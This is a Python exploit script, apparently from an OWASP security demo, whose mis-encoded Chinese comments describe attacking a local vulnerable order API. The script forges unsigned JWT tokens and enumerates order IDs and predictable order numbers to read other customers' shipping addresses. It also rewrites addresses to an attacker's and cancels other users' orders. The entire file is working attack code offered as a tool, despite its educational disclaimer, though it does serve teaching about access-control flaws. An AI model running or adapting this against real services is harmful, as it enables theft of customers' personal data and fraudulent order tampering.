#!/usr/bin/env python3
"""
IDORï¼ˆä¸å®‰å…¨çš„ç›´æ¥ç‰©ä»¶åƒè€ƒï¼‰æ”»æ“Šè…³æœ¬
====================================
æ­¤è…³æœ¬å±•ç¤ºå¦‚ä½•åˆ©ç”¨ IDOR æ¼æ´å­˜å–å…¶ä»–ä½¿ç”¨è€…çš„è¨‚å–®è³‡æ–™ã€‚

æ”»æ“ŠåŸç†ï¼š
---------
æ¼æ´ç‰ˆæœ¬çš„è¨‚å–® API ä½¿ç”¨å¯é æ¸¬çš„è¨‚å–®ç·¨è™Ÿï¼ˆORD-00001, ORD-00002...ï¼‰ï¼Œ
ä¸”æ²’æœ‰é©—è­‰ç•¶å‰ä½¿ç”¨è€…æ˜¯å¦ç‚ºè¨‚å–®æ“æœ‰è€…ã€‚æ”»æ“Šè€…å¯ä»¥ï¼š
1. æšèˆ‰è¨‚å–®ç·¨è™Ÿ
2. å­˜å–ä»»ä½•ä½¿ç”¨è€…çš„è¨‚å–®
3. ä¿®æ”¹æˆ–åˆªé™¤å…¶ä»–ä½¿ç”¨è€…çš„è¨‚å–®

ä½œè€…ï¼šOWASP Demo
"""

import requests
import json
import argparse
import base64
from datetime import datetime, timedelta

# é…ç½®
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def base64url_encode(data: bytes) -> str:
    """Base64 URL ç·¨ç¢¼ï¼ˆç„¡å¡«å……ï¼‰"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def create_token(user_id: int, username: str, role: str = "USER") -> str:
    """å»ºç«‹å½é€ çš„ JWT Tokenï¼ˆæ¼æ´ç‰ˆæœ¬ä¸é©—è­‰ç°½åï¼‰"""
    header = {"alg": "HS256", "typ": "JWT"}
    now = datetime.utcnow()
    payload = {
        "sub": username,
        "userId": user_id,
        "username": username,
        "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(hours=24)).timestamp())
    }
    
    header_encoded = base64url_encode(json.dumps(header).encode())
    payload_encoded = base64url_encode(json.dumps(payload).encode())
    fake_signature = base64url_encode(b"FAKE")
    
    return f"{header_encoded}.{payload_encoded}.{fake_signature}"


def login(username: str, password: str, url: str = VULNERABLE_URL) -> str:
    """ç™»å…¥å–å¾— Token"""
    response = requests.post(
        f"{url}/api/auth/login",
        json={"username": username, "password": password}
    )
    
    if response.status_code == 200:
        return response.json().get("token")
    return None


def get_order_by_id(order_id: int, token: str, url: str = VULNERABLE_URL) -> dict:
    """é€éè¨‚å–® ID å–å¾—è¨‚å–®"""
    response = requests.get(
        f"{url}/api/orders/{order_id}",
        headers={"Authorization": f"Bearer {token}"}
    )
    
    if response.status_code == 200:
        return response.json()
    return None


def get_order_by_number(order_number: str, token: str, url: str = VULNERABLE_URL) -> dict:
    """é€éè¨‚å–®ç·¨è™Ÿå–å¾—è¨‚å–®"""
    response = requests.get(
        f"{url}/api/orders/number/{order_number}",
        headers={"Authorization": f"Bearer {token}"}
    )
    
    if response.status_code == 200:
        return response.json()
    return None


def enumerate_orders_by_id(token: str, max_id: int = 20, url: str = VULNERABLE_URL):
    """
    ğŸ”´ æ”»æ“Šï¼šæšèˆ‰è¨‚å–® ID
    å˜—è©¦å­˜å–ä¸åŒçš„è¨‚å–® ID
    """
    print("\n" + "=" * 60)
    print(f"ğŸ”´ IDOR æ”»æ“Šï¼šæšèˆ‰è¨‚å–® IDï¼ˆ1 åˆ° {max_id}ï¼‰")
    print("=" * 60)
    
    found_orders = []
    
    for order_id in range(1, max_id + 1):
        order = get_order_by_id(order_id, token, url)
        if order:
            found_orders.append(order)
            print(f"âœ… è¨‚å–® ID {order_id}: {order.get('orderNumber')} - ${order.get('totalAmount')}")
            print(f"   ğŸ“ é…é€åœ°å€: {order.get('shippingAddress', 'N/A')}")
            if order.get('notes'):
                print(f"   ğŸ“ å‚™è¨»: {order.get('notes')}")
        else:
            print(f"âŒ è¨‚å–® ID {order_id}: ä¸å­˜åœ¨æˆ–ç„¡æ³•å­˜å–")
    
    print(f"\nğŸ“Š ç¸½è¨ˆæ‰¾åˆ° {len(found_orders)} ç­†è¨‚å–®")
    return found_orders


def enumerate_orders_by_number(token: str, max_num: int = 20, url: str = VULNERABLE_URL):
    """
    ğŸ”´ æ”»æ“Šï¼šæšèˆ‰è¨‚å–®ç·¨è™Ÿ
    åˆ©ç”¨å¯é æ¸¬çš„è¨‚å–®ç·¨è™Ÿæ ¼å¼ï¼ˆORD-00001, ORD-00002...ï¼‰
    """
    print("\n" + "=" * 60)
    print(f"ğŸ”´ IDOR æ”»æ“Šï¼šæšèˆ‰è¨‚å–®ç·¨è™Ÿï¼ˆORD-00001 åˆ° ORD-{max_num:05d}ï¼‰")
    print("=" * 60)
    
    found_orders = []
    
    for i in range(1, max_num + 1):
        order_number = f"ORD-{i:05d}"
        order = get_order_by_number(order_number, token, url)
        if order:
            found_orders.append(order)
            print(f"âœ… {order_number}: ${order.get('totalAmount')} - {order.get('status')}")
            print(f"   ğŸ“ é…é€åœ°å€: {order.get('shippingAddress', 'N/A')}")
            if order.get('notes'):
                print(f"   ğŸ“ å‚™è¨»: {order.get('notes')}")
        else:
            print(f"âŒ {order_number}: ä¸å­˜åœ¨æˆ–ç„¡æ³•å­˜å–")
    
    print(f"\nğŸ“Š ç¸½è¨ˆæ‰¾åˆ° {len(found_orders)} ç­†è¨‚å–®")
    return found_orders


def attack_modify_order(order_id: int, token: str, url: str = VULNERABLE_URL):
    """
    ğŸ”´ æ”»æ“Šï¼šä¿®æ”¹å…¶ä»–ä½¿ç”¨è€…çš„è¨‚å–®
    """
    print("\n" + "=" * 60)
    print(f"ğŸ”´ IDOR æ”»æ“Šï¼šä¿®æ”¹è¨‚å–® ID {order_id}")
    print("=" * 60)
    
    # å…ˆå–å¾—åŸè¨‚å–®
    original = get_order_by_id(order_id, token, url)
    if not original:
        print(f"âŒ ç„¡æ³•å–å¾—è¨‚å–® {order_id}")
        return
    
    print(f"ğŸ“‹ åŸè¨‚å–®è³‡æ–™ï¼š")
    print(f"   ç‹€æ…‹: {original.get('status')}")
    print(f"   åœ°å€: {original.get('shippingAddress')}")
    
    # å˜—è©¦ä¿®æ”¹è¨‚å–®
    new_address = "æ”»æ“Šè€…åœ°å€ï¼šå°åŒ—å¸‚ä¿¡ç¾©å€é»‘å®¢è·¯ 666 è™Ÿ"
    response = requests.put(
        f"{url}/api/orders/{order_id}",
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        },
        json={
            "shippingAddress": new_address,
            "notes": "è¨‚å–®å·²è¢«æ”»æ“Šè€…ä¿®æ”¹ï¼"
        }
    )
    
    if response.status_code == 200:
        print(f"\nâœ… è¨‚å–®ä¿®æ”¹æˆåŠŸï¼")
        modified = response.json()
        print(f"   æ–°åœ°å€: {modified.get('shippingAddress')}")
        print(f"   âš ï¸ é€™ä»£è¡¨æ”»æ“Šè€…å¯ä»¥å°‡å•†å“é…é€åˆ°è‡ªå·±çš„åœ°å€ï¼")
    else:
        print(f"\nâŒ ä¿®æ”¹å¤±æ•—: {response.status_code}")
        print(f"   {response.text}")


def attack_cancel_order(order_id: int, token: str, url: str = VULNERABLE_URL):
    """
    ğŸ”´ æ”»æ“Šï¼šå–æ¶ˆå…¶ä»–ä½¿ç”¨è€…çš„è¨‚å–®
    """
    print("\n" + "=" * 60)
    print(f"ğŸ”´ IDOR æ”»æ“Šï¼šå–æ¶ˆè¨‚å–® ID {order_id}")
    print("=" * 60)
    
    response = requests.post(
        f"{url}/api/orders/{order_id}/cancel",
        headers={"Authorization": f"Bearer {token}"}
    )
    
    if response.status_code == 200:
        print(f"âœ… è¨‚å–®å–æ¶ˆæˆåŠŸï¼")
        print(f"   âš ï¸ æ”»æ“Šè€…å¯ä»¥æƒ¡æ„å–æ¶ˆå…¶ä»–ä½¿ç”¨è€…çš„è¨‚å–®ï¼")
    else:
        print(f"âŒ å–æ¶ˆå¤±æ•—: {response.status_code}")


def compare_vulnerability():
    """
    æ¯”è¼ƒæ¼æ´ç‰ˆæœ¬èˆ‡å®‰å…¨ç‰ˆæœ¬çš„å·®ç•°
    """
    print("\n" + "=" * 60)
    print("ğŸ“Š æ¼æ´ç‰ˆæœ¬ vs å®‰å…¨ç‰ˆæœ¬æ¯”è¼ƒ")
    print("=" * 60)
    
    # ä½¿ç”¨ userï¼ˆID=2ï¼‰çš„èº«ä»½å˜—è©¦å­˜å– adminï¼ˆID=1ï¼‰çš„è¨‚å–®
    # ä½¿ç”¨å½é€ çš„ tokenï¼ˆæ¼æ´ç‰ˆæœ¬ï¼‰æˆ–çœŸå¯¦ç™»å…¥ï¼ˆå®‰å…¨ç‰ˆæœ¬ï¼‰
    
    print("\nğŸ“‹ æƒ…å¢ƒï¼šä½¿ç”¨è€… 'user'ï¼ˆID=2ï¼‰å˜—è©¦å­˜å– 'admin'ï¼ˆID=1ï¼‰çš„è¨‚å–®")
    print("   admin çš„è¨‚å–®ï¼šORD-00001, ORD-00002, ORD-00003")
    
    # æ¼æ´ç‰ˆæœ¬æ¸¬è©¦
    print("\nğŸ”“ æ¼æ´ç‰ˆæœ¬ï¼ˆhttp://localhost:8081ï¼‰ï¼š")
    user_token = create_token(2, "user", "USER")
    for order_num in ["ORD-00001", "ORD-00002"]:
        order = get_order_by_number(order_num, user_token, VULNERABLE_URL)
        if order:
            print(f"   âœ… {order_num}: å¯å­˜å–ï¼åœ°å€={order.get('shippingAddress', 'N/A')[:20]}...")
        else:
            print(f"   âŒ {order_num}: ç„¡æ³•å­˜å–")
    
    # å®‰å…¨ç‰ˆæœ¬æ¸¬è©¦
    print("\nğŸ”’ å®‰å…¨ç‰ˆæœ¬ï¼ˆhttp://localhost:8082ï¼‰ï¼š")
    # éœ€è¦çœŸå¯¦ç™»å…¥ï¼ˆå®‰å…¨ç‰ˆæœ¬æœƒé©—è­‰ JWT ç°½åï¼‰
    try:
        secure_token = login("user", "user123", SECURE_URL)
        if secure_token:
            for order_num in ["ORD-00001", "ORD-00002"]:
                response = requests.get(
                    f"{SECURE_URL}/api/orders/number/{order_num}",
                    headers={"Authorization": f"Bearer {secure_token}"}
                )
                if response.status_code == 200:
                    print(f"   âœ… {order_num}: å¯å­˜å–")
                elif response.status_code == 403:
                    print(f"   âŒ {order_num}: å­˜å–è¢«æ‹’çµ•ï¼ˆ403 Forbiddenï¼‰")
                elif response.status_code == 404:
                    print(f"   âŒ {order_num}: æ‰¾ä¸åˆ°ï¼ˆå°ä½¿ç”¨è€…éš±è—ï¼‰")
                else:
                    print(f"   âŒ {order_num}: {response.status_code}")
        else:
            print("   âš ï¸ ç„¡æ³•ç™»å…¥å®‰å…¨ç‰ˆæœ¬")
    except Exception as e:
        print(f"   âš ï¸ å®‰å…¨ç‰ˆæœ¬é€£ç·šå¤±æ•—: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="IDOR æ”»æ“Šå·¥å…· - è¨‚å–®å­˜å–æ¼æ´å±•ç¤º",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ç¯„ä¾‹ï¼š
  python idor_exploit.py --enum-id              # æšèˆ‰è¨‚å–® ID
  python idor_exploit.py --enum-number          # æšèˆ‰è¨‚å–®ç·¨è™Ÿ
  python idor_exploit.py --modify 1             # ä¿®æ”¹è¨‚å–® ID=1
  python idor_exploit.py --cancel 1             # å–æ¶ˆè¨‚å–® ID=1
  python idor_exploit.py --compare              # æ¯”è¼ƒæ¼æ´/å®‰å…¨ç‰ˆæœ¬
  python idor_exploit.py --all                  # åŸ·è¡Œå®Œæ•´æ¼”ç¤º
        """
    )
    
    parser.add_argument("--enum-id", action="store_true", help="æšèˆ‰è¨‚å–® ID")
    parser.add_argument("--enum-number", action="store_true", help="æšèˆ‰è¨‚å–®ç·¨è™Ÿ")
    parser.add_argument("--modify", type=int, help="ä¿®æ”¹æŒ‡å®šè¨‚å–® ID")
    parser.add_argument("--cancel", type=int, help="å–æ¶ˆæŒ‡å®šè¨‚å–® ID")
    parser.add_argument("--compare", action="store_true", help="æ¯”è¼ƒæ¼æ´/å®‰å…¨ç‰ˆæœ¬")
    parser.add_argument("--all", action="store_true", help="åŸ·è¡Œå®Œæ•´æ¼”ç¤º")
    parser.add_argument("--max", type=int, default=15, help="æšèˆ‰çš„æœ€å¤§æ•¸é‡")
    parser.add_argument("--user", default="user", help="æ”»æ“Šè€…å¸³è™Ÿ")
    parser.add_argument("--password", default="user123", help="æ”»æ“Šè€…å¯†ç¢¼")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("ğŸ”“ IDOR æ”»æ“Šå·¥å…· - è¨‚å–®å­˜å–æ¼æ´å±•ç¤º")
    print("=" * 60)
    print(f"âš ï¸ æ­¤å·¥å…·åƒ…ä¾›æ•™è‚²ç›®çš„ï¼è«‹å‹¿ç”¨æ–¼éæ³•æ´»å‹•ã€‚")
    print(f"ğŸ“ ç›®æ¨™ï¼š{VULNERABLE_URL}")
    
    # å–å¾—æ”»æ“Šè€…çš„ Token
    # æ¼æ´ç‰ˆæœ¬å¯ç”¨å½é€  Token
    token = create_token(2, args.user, "USER")
    print(f"ğŸ”‘ ä½¿ç”¨å½é€  Tokenï¼ˆæ¼æ´ç‰ˆæœ¬ä¸é©—è­‰ï¼‰")
    
    if args.all:
        enumerate_orders_by_id(token, args.max)
        enumerate_orders_by_number(token, args.max)
        compare_vulnerability()
    elif args.enum_id:
        enumerate_orders_by_id(token, args.max)
    elif args.enum_number:
        enumerate_orders_by_number(token, args.max)
    elif args.modify:
        attack_modify_order(args.modify, token)
    elif args.cancel:
        attack_cancel_order(args.cancel, token)
    elif args.compare:
        compare_vulnerability()
    else:
        parser.print_help()
        print("\nğŸ’¡ å¿«é€Ÿé–‹å§‹ï¼špython idor_exploit.py --all")


if __name__ == "__main__":
    main()
